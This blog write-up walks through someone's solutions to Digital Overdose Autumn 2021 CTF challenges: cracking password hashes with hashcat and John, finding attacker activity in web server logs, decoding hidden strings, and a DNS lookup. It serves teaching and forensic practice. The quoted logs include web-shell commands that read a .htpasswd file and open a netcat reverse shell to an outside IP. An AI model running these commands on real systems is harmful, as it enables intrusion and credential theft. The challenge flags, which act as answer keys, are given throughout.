---
title: "Digital Overdose Autumn 2021 CTF - Part 1: Hash Cracking, Log Analysis, Source Analysis, Reversing, Steg, Misc"
date: 2021-10-09
layout: single
tags:
  - CTF
---

During the weekend of 09.10 and 10.10, I participated in [Digital Overdose Autumn 2021 CTF](https://digitaloverdose.tech/ctf/2021-autumn) with [@de3ev](https://twitter.com/de3ev), [@CatieSai](https://twitter.com/CatieSai), and [@msdaniellearcon](https://twitter.com/msdaniellearcon). Our team ended up with 2361 points, and me with 15 individual solves.

![](/assets/writeups/DigitalOverdose/doctf-pidnull.png)

Here is part 1 of my writeup for the challenges I solved for this CTF. This part includes these categories: Hash Cracking, Log Analysis, Source Analysis, Reversing, Steganography, and Miscellaneous.

---

## Hash Cracking

Summary: Each challenge in this category consisted of a hash, and the goal was to crack and submit them as the flag (ex. `DO{happyfamily}`).

### Hash 4

- Hash: `451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723`
- I did spend some time trying to crack this hash with `hashcat`. The the various *sha256* hash formats did not work. I tried with John The Ripper, and it automatically detected the hash as `gost`.
- Crack: `john hash --wordlist=rockyou.txt`
- Plain text: `happyfamily`
- With hashcat: `hashcat -a 0 hash --wordlist rockyou.txt -m 6900`

### Hash 5

- Hash: `$2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6`
- This is `bcrypt` based on the leading characters `$2.$`.
- Crack: `hashcat -a 0 -m 3200 hash --wordlist rockyou.txt`
- Plain text: `cowabunga`

### Hash 6

- Hash: `$1$veryrand$QetWu27IoJ2FFSG30xKAQ.`
- This is an `md5crypt` based on `$1$`.
- Crack: `hashcat -a 0 -m 500 hash --wordlist rockyou.txt`
- Plain text: `scottiebanks`.

### Hash 7

Hash: `$6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1`
-  This is `sha512crypt` based on `$6$`.
- Crack: `hashcat -a 0 -m  1800 hash --wordlist rockyou.txt`
- Plain text: `igetmoney`.

---

## Log Analysis

Summary: The challenges in this category were all related. The goal was to find out information about a successful server compromise by looking at the server logs.

### Part 1 - Ingress

Challenge description:

> Our website was hacked recently and the attackers completely ransomwared our server!
> 
> We've recovered it now, but we don't want it to happen again. 
> 
> Here are the logs from before the attack, can you find out what happened?

The challenge had a downloadable file `attack.7z`.

Inspect the contents, then extract:

```bash
--
Path = attack.7z
Type = 7z
Physical Size = 352039
Headers Size = 130
Method = LZMA2:12m
Solid = -
Blocks = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-05 21:54:07 ....A      9778095       351909  attack.log
------------------- ----- ------------ ------------  ------------------------
2021-10-05 21:54:07            9778095       351909  1 files

# extract
-rw-r--r-- 1 juancho juancho 9778095 Oct  5 21:54 attack.log
```

Inspect attack.log:

```
juancho💀hackbox:Part1$ head -5 attack.log
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2021-09-01 00:28:00 135.233.142.30 GET polyfills-es5.9fba121277a252cdf0fa.js - 443 - 83.147.40.142 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+WOW64;+Trident/5.0) - 200 0 0 22
2021-09-01 00:28:00 135.233.142.30 GET assets/images/ctf/2021-autumn/ractf_logo.svg - 443 - 83.147.40.142 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+WOW64;+Trident/5.0) - 200 0 0 26
2021-09-01 00:28:00 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 83.147.40.142 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+WOW64;+Trident/5.0) - 200 0 0 24
2021-09-01 00:28:00 135.233.142.30 GET dovercon/2021/about - 443 - 83.147.40.142 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+WOW64;+Trident/5.0) - 200 0 0 27
juancho💀hackbox:Part1$ tail -5 attack.log
2021-09-06 23:49:09 135.233.142.30 GET 8-es2015.9f210c2bd083cdacb0ee.js - 443 - 194.48.242.119 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/team-edition-2021 200 0 0 22
2021-09-06 23:49:09 135.233.142.30 GET ctf - 443 - 194.48.242.119 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/team-edition-2021 200 0 0 26
2021-09-06 23:49:22 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 194.48.242.119 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1) https://digitaloverdose.tech/ctf 200 0 0 30
2021-09-06 23:49:22 135.233.142.30 GET 6-es2015.2c367e3b65026d7698d3.js - 443 - 194.48.242.119 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1) https://digitaloverdose.tech/ctf 200 0 0 21
2021-09-06 23:49:22 135.233.142.30 GET conference - 443 - 194.48.242.119 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1) https://digitaloverdose.tech/ctf 200 0 0 20
juancho💀hackbox:Part1$ wc -l attack.log 
38548 attack.log
juancho💀hackbox:Part1$ 
```

This looks like web access logs with 38k+ lines.

After a few minutes of poking around, I decided with the approach to filter out lines for web resources which might be innocent (known URLs, javascript files, etc.). This left 334 lines, such as the following:

```
...
2021-09-06 20:44:00 135.233.142.30 GET ivory-market - 443 - 155.198.11.229 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+Media+Center+PC+6.0;+.NET4.0C;+.NET4.0E) - 404 0 0 26
2021-09-06 20:44:19 135.233.142.30 GET ywesusnz cmd%3Dcd+.. 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/faq 200 0 0 20
2021-09-06 20:44:45 135.233.142.30 GET ywesusnz cmd%3Dpwd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
2021-09-06 20:45:04 135.233.142.30 GET ywesusnz cmd%3Dwhoami 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 25
2021-09-06 20:45:16 135.233.142.30 GET ywesusnz cmd%3Dhostname 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 25
2021-09-06 20:45:46 135.233.142.30 GET ywesusnz cmd%3Dnetstat+-peanut 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 21
2021-09-06 20:46:04 135.233.142.30 GET ywesusnz cmd%3Dcat+%2Fvar%2Fwww%2F.htpasswd 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 22
2021-09-06 20:46:12 135.233.142.30 GET ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ== 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 26
2021-09-06 20:46:19 135.233.142.30 GET ywesusnz cmd%3Dnc+-e+%2Fbin%2Fsh+207.35.160.84+4213 443 - 20.132.161.193 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.0;+Trident/5.0) https://digitaloverdose.tech/ywesusnz 200 0 0 20
2021-09-06 20:56:00 135.233.142.30 GET cream-alignment - 443 - 157.203.61.47 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/64.0.3282.186+Safari/537.36 - 404 0 0 30
2021-09-06 21:37:00 135.233.142.30 GET tomato-creative - 443 - 185.249.217.21 Mozilla/5.0+(iPhone;+CPU+iPhone+OS+13_3_1+like+Mac+OS+X)+AppleWebKit/605.1.15+(KHTML,+like+Gecko)+Version/13.0.5+Mobile/15E148+Safari/604.1+Safari+13 - 404 0 0 20
2021-09-06 21:47:00 135.233.142.30 GET camel-material - 443 - 91.189.92.106 Mozilla/5.0+(compatible;+MSIE+9.0;+Windows+NT+6.1;+Win64;+x64;+Trident/5.0) - 404 0 0 21
```

Of course, `cmd` and `whoami` were eye-catchers. Also noticed `RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==`, which is base64 to the flag for this challenge:

> DO{better_remove_that_backdoor}

### Part 2 - Investigation and Part 3 - Backup Policy

Challenge descriptions:

Part 2:

> Thanks for finding the RFI vulnerability in our FAQ.  We have fixed it now, but we don't understand how the attacker found it so quickly.
> 
> We suspect it might be an inside job, but maybe they got the source another way.  Here are the logs for the month prior to the attack, can you see anything suspicious?
> 
> Please submit the attackers IP as the flag as follow, DO{x.x.x.x}

Part 3:

> So it looks like the attacker scanned our site for old backups right?  Did he get one?

This challenge had the downloadable file `more.7z`.

```bash
...
juancho💀hackbox:Part2-3$ ll more.log 
-rw-r--r-- 1 juancho juancho 48201050 Oct  5 21:54 more.log
juancho💀hackbox:Part2-3$ wc -l more.log
191618 more.log
juancho💀hackbox:Part2-3$ tail -4 more.log
2021-08-31 23:33:48 45.85.1.176 GET dovercon/2021 - 443 - 31.185.221.23 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/2021/schedule 200 0 0 23
2021-08-31 23:34:04 45.85.1.176 GET assets/images/community/cal-bg.svg - 443 - 31.185.221.23 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/2021 200 0 0 22
2021-08-31 23:34:04 45.85.1.176 GET assets/images/ctf/2021-autumn/logo-htb.svg - 443 - 31.185.221.23 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/2021 200 0 0 20
2021-08-31 23:34:04 45.85.1.176 GET privacy - 443 - 31.185.221.23 Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) https://digitaloverdose.tech/dovercon/2021 200 0 0 20
juancho💀hackbox:Part2-3$ 
```

Looked like continuation to the server logs. The previous IP of the attacker and "ywesusnz" did not appear on this log. So, after performing the same task of filtering out innocent-looking lines, there were only 2165 lines left. With a visual inspection, some lines at "2021-08-03 08:55" stood out:

```bash
2021-08-03 08:55:08 45.85.1.176 GET ..//settings.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 29
2021-08-03 08:55:08 45.85.1.176 GET 1/settings.older - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 21
2021-08-03 08:55:08 45.85.1.176 GET admin/auth.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 25
2021-08-03 08:55:08 45.85.1.176 GET archives/login.saved - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 30
2021-08-03 08:55:08 45.85.1.176 GET ../../..//.htaccess.tgz - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 27
2021-08-03 08:55:08 45.85.1.176 GET 1/db_config.older - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 26
2021-08-03 08:55:08 45.85.1.176 GET ../../..//settings.3 - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 22
2021-08-03 08:55:08 45.85.1.176 GET archives/config.copy.copy - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 22
2021-08-03 08:55:08 45.85.1.176 GET auth.tgz - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 404 0 0 30
```

There were 564 lines of these, but there were a lot of 404s. It looked like the attacker was enumerating the server for backups.

```bash
juancho💀hackbox:Part2-3$ cat narrowed.list | grep "^2021-08-03 08:55" | wc -l
564
juancho💀hackbox:Part2-3$ 
```

Filtering out 404s, only 1 was left:

```bash
juancho💀hackbox:Part2-3$ cat narrowed.list | grep "^2021-08-03 08:55" | grep -v 404
2021-08-03 08:55:00 45.85.1.176 GET backup.zip - 443 - 200.13.84.124 Mozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 - 200 0 0 25
juancho💀hackbox:Part2-3$ 
```

The IP address of the attacker was the answer for Part 2 and the base64-decode of the hash was the answer to Part 3.

> DO{45.85.1.176}

> DO{s3cr3t___agent}

---

## Source Analysis

Summary: The challenges in this category were for source code analysis.

### A1 - C-nanigans

Challenge description:

> Find the flag parts in the source code, assemble the flag, submit the flag.
> 
> (This code may not compile, and it is useless to attempt to do so)

The challenge had a downloadable file [chal.c](/assets/writeups/DigitalOverdose/chal.c).

Trusting the instruction, my approach was to look for strings or hex representations of strings that could make up the flag `DO{_s0meth1ng_}`.

Line 301 caught my eye:

```c
    #define fp3 0x5f406e616c79333173
```

Try to decode:

```python
>>> hexxy = "0x5f406e616c79333173"[2:]
>>> print(hexxy)
5f406e616c79333173
>>> print(bytes.fromhex(hexxy).decode("ascii"))
_@naly31s
>>> 
```

That looked like a readable flag-like string. Based on the variable "fp3", I ended up finding fp1, 2, and 4. Combined the 4 hex values and got:

```python
>>> print(bytes.fromhex("0x444f7b7330755263335f406e616c793331737d"[2:]).decode("ascii"))
DO{s0uRc3_@naly31s}
>>> 
```

---

## Reversing

Summary: The challenges in this category were for reverse engineering. I was only able to solve 1 challenge was for ELF binary analysis.

### Dyms, Syms, and Tabs

Challenge description:

> I don't remember what my C file name was before I compiled it!! Help me recover the file name of the source code for this file :O
> 
> You have to manually add the DO{} flag wrapper without the FILE EXTENSION or that would be too easy ;)

The challenge had a downloadable file [chall](/assets/writeups/DigitalOverdose/chall).

```bash
chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=5d7353a70cb83ad57a2a2caea60dcf9fbbbbb599, for GNU/Linux 3.2.0, not stripped
```

With the goal of only looking for the file names, this command was enough:

```bash
juancho💀hackbox:DigitalOverdose$ readelf -s chall | grep FILE
...
   164: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS u_f0unD_dA_f1a4y4Y.c
...
```

> DO{u_f0unD_dA_f1a4y4Y}

---

## Steganography

Summary: The challenges in this category were all about steganography.

### A cornucopia of numbers

Challenge description:

> See the attached file (Bin.txt)

There was a download file Bin.txt which contained the binary representation of something:

```
juancho💀hackbox:a-cornucopia-of-numbers$ cat Bin.txt 
01010010 01000101 00111001 00110111 01010001 01111010 01000010 01110101 01010110 01101101 01010110 01010011 01001110 01010100 01000101 01110111 01100010 01101100 00111001 01110100 01001110 01000101 01010010 01110101 01001101 01111010 01010101 00110001 01100110 01010001 00111101 00111101
juancho💀hackbox:a-cornucopia-of-numbers$ 
```

Paste to CyberChef and select 'From Binary', the Base64 message is returned: `RE97QzBuVmVSNTEwbl9tNERuMzU1fQ==`.

> DO{C0nVeR510n_m4Dn355}

### Queen's gambit

Challenge description:

> See the attached file (Freddie_Mercury.png)

There was a downloadable file [Freddie_Mercury.png](/assets/writeups/DigitalOverdose/Freddie_Mercury.png).

```bash
juancho💀hackbox:Queens-Gambit$ file Freddie_Mercury.png
Freddie_Mercury.png: PNG image data, 562 x 787, 8-bit/color RGB, non-interlaced
juancho💀hackbox:Queens-Gambit$ 
```

Basic checks, got the flag:

```bash
juancho💀hackbox:Queens-Gambit$ strings Freddie_Mercury.png | tail
O/DIL,
CT"vYRP
 bdR
*4\n1
=55Z	
jwgf
PGHC'
'tEXtAuthor
RE97VzNfYVIzX3RoM19DaDRtUDEwblN9
IEND
juancho💀hackbox:Queens-Gambit$ echo RE97VzNfYVIzX3RoM19DaDRtUDEwblN9 | base64 -d
DO{W3_aR3_th3_Ch4mP10nS}
```

### The Detective

Challenge description:

> See the attached file (Pika.jpeg)

There was a downloadable file [Pika.jpeg](/assets/writeups/DigitalOverdose/Pika.jpeg).

```bash
juancho💀hackbox:The-Detective$ file Pika.jpeg
Pika.jpeg: JPEG image data, baseline, precision 8, 640x360, components 3
juancho💀hackbox:The-Detective$ 
 
```

Basic checks, got the flag:

```bash
juancho💀hackbox:The-Detective$ strings Pika.jpeg | tail
?O*6d
<G\]N>
6>RI 
nRIk
?!r=GW
6M1k
yrT`>
!$p(
BAKZ
DO{H1d1nG_iN_Pl41n_SiGhT}
juancho💀hackbox:The-Detective$ 
```

---

## Misc

### Outage: The usual suspect

Challenge description:

> Digital Overdose has a website, and you can access some information about it without really needing to visit, a bit like a phone book of sorts.
> 
> Find the flag :)

At first, the challenge sounded to me like `sitemap.xml`. I did find [it](https://digitaloverdose.tech/sitemap.xml) but nothing was there.

Next, I poked at DNS and the flag was there.

```bash
juancho💀hackbox:Misc$ dig digitaloverdose.tech -t TXT +short
"DO{1T$_4LW4Y$_DN5}"
"google-site-verification=qN3ndcZtU8mXrY_HbsDCQeSzel93DrZAWidDZ5Ol1gY"
"keybase-site-verification=YzZfhDKfOJdQ2b2Z_mMITYSzjQIN9Qd7dfYkQ5sz77k"
"v=spf1 include:spf.efwd.registrar-servers.com ~all"
"google-site-verification=SNWrpKpmjvLywAg9yOnJ7f5aCy7rqMvWQZwHyVEc7yE"
juancho💀hackbox:Misc$ 
```

> DO{1T$_4LW4Y$_DN5}

---


Thanks for reading my writeup. Check [here](/2021/10/09/DigitalOverdoseCTF-Part2.html) for part 2!
